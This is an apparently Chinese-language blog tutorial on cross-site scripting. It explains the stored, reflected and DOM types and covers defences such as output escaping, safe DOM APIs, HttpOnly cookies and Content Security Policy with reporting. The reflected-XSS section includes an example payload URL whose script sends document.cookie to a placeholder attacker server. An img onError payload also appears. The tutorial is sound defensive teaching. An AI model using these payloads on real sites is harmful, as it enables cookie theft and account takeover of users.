什么是XSS及XSS基本防护手段

发表于 2022-03-30
XSS（Cross-Site Scripting）是一种跨站脚本攻击，攻击者通过在目标网站上注入恶意脚本，导致用户在访问该网站时执行恶意代码。

什么是XSS？

XSS（Cross-Site Scripting）是一种跨站脚本攻击，攻击者通过在目标网站上注入恶意脚本，导致用户在访问该网站时执行恶意代码。
这些恶意脚本可以包括但不限于：获取用户信息、窃取token/cookie、修改用户数据、重定向用户到恶意网站等。

XSS类型

  • 存储型XSS
  • 反射型XSS
  • DOM型XSS

存储型 XSS（持久型）

攻击流程：

  1. 攻击者在可提交内容的地方（评论、留言、昵称、个人简介）提交一段恶意 JS 代码。
  2. 后端没过滤，直接存进数据库。
  3. 其他用户打开这个页面时，后端把恶意代码从数据库取出来，直接渲染到页面。
  4. 浏览器执行这段 JS，完成攻击。

一句话总结：代码存数据库 → 所有人访问都中招 → 危害最大。

反射型 XSS（非持久型）

攻击流程：

  1. 攻击者构造一个带恶意代码的 URL 比如：https://xxx.com/search?q=<script>fetch('https://攻击者服务器/steal?c='+document.cookie)</script>。
  2. 诱导用户点击这个链接。
  3. 后端把 URL 里的参数直接 “反射” 回页面（比如搜索框提示、报错信息）。
  4. 浏览器执行 JS，完成攻击。

一句话总结：代码在 URL 里 → 点链接才中招 → 不存库，一次性。

DOM 型 XSS（前端型）

攻击流程：

  1. 攻击者同样构造带恶意代码的 URL。
  2. 用户点击链接。
  3. 后端不参与，前端 JS 直接从 URL 取参数，用 innerHTML、document.write、eval 等方式直接插入 DOM。
  4. 浏览器执行 JS，完成攻击。

一句话总结：全程前端操作 DOM → 不经过后端、不进数据库 → 最隐蔽。

随着浏览器对浏览器安全的发展重视，DOM 型 XSS 攻击的难度增加，但是仍然存在。
比如：插入一个<script>标签，现代浏览器可能不会执行这个标签里的代码，但是旧版浏览器还是会执行。
比如：插入一个<img src="xxx" onError="alert('xss')">标签，给标签注册一个onError事件，当图片加载失败时执行恶意代码。

三者最核心区别:

存储型：恶意代码存在数据库
反射型：恶意代码在URL，后端参与渲染
DOM 型：恶意代码在URL，前端直接操作 DOM，后端无感

XSS基本防护手段

  1. 输入验证：对用户输入进行验证，只允许输入安全的字符。
  2. 输出转义：对用户输入进行转义，防止浏览器执行恶意代码。
  3. 使用安全的API：避免使用 innerHTML、document.write 等 API，改用 innerText、textContent 等安全 API。
  4. 开启 CSP 内容安全策略
  5. Cookie 设置 HttpOnly、Secure
  6. 本地存储（localStorage、sessionStorage）不存储用户敏感信息

CSP 内容安全策略

CSP（Content Security Policy）是一种用于防止 XSS 攻击的机制，通过指定允许加载的资源来源，来限制浏览器执行的代码。

开启方式

  1. 在 HTML 头部添加 meta 标签，指定 CSP 政策。
  2. 在 HTTP 头中添加 CSP 头。 注意：
  • 优先使用http头开启CSP，因为meta标签：
    • 不支持 frame-ancestors、report-uri、sandbox 部分属性
    • 不能使用 Content-Security-Policy-Report-Only
    • 有可能被浏览器插件拦截删除

常用指令含义

  • default-src ‘self’：默认只加载同域资源
  • script-src：限制 JS 来源
  • style-src：限制 CSS
  • img-src：限制图片
  • connect-src：限制 fetch/axios/ajax 请求
  • frame-src：限制 iframe
  • object-src ‘none’：禁止插件（Flash 等）
  • frame-ancestors ‘none’：防止被 iframe 嵌套（防点击劫持）
  • unsafe-inline：允许内联 script/style
  • unsafe-eval：允许 eval，尽量别开

CSP 报告

CSP 上报主要用于调试策略、发现违规资源、监控潜在攻击，在不影响业务的情况下收集违规日志，帮助安全加固和问题排查。

  1. 上线前灰度验证
    先开启 Content-Security-Policy-Report-Only 只上报、不拦截，收集页面所有资源加载情况，看哪些资源不符合策略，避免直接上线导致页面瘫痪。

  2. 发现遗漏的非法资源
    线上环境如果出现未授权脚本、图片、接口请求，CSP 会自动上报，帮助定位潜在 XSS 攻击、非法资源引入。

  3. 监控安全违规行为
    报告里会包含违规资源地址、触发位置、页面 URL，可用于安全审计、追溯攻击来源。

  4. 逐步收紧安全策略
    从宽松策略逐步收紧，通过报告观察影响，在不影响业务的前提下提升安全性。

设置 CSP 报告 URI 主要有两种方式：

  1. 使用传统 report-uri（兼容旧版浏览器） 在 HTTP 响应头 Content-Security-Policy 中配置：
  • report-uri：指定浏览器发送违规报告的 POST 地址，支持相对路径或绝对 URL
  • 注意：CSP 3 已弃用，但兼容性最好，生产环境建议保留
  1. 现代 report-to（CSP 3 标准，推荐），需先通过 Reporting-Endpoints 定义上报端点，再在 CSP 中引用
  • 优势：支持多端点、批量上报，符合最新标准。
  • 兼容：现代浏览器支持，旧版浏览器可同时配置 report-uri 做降级
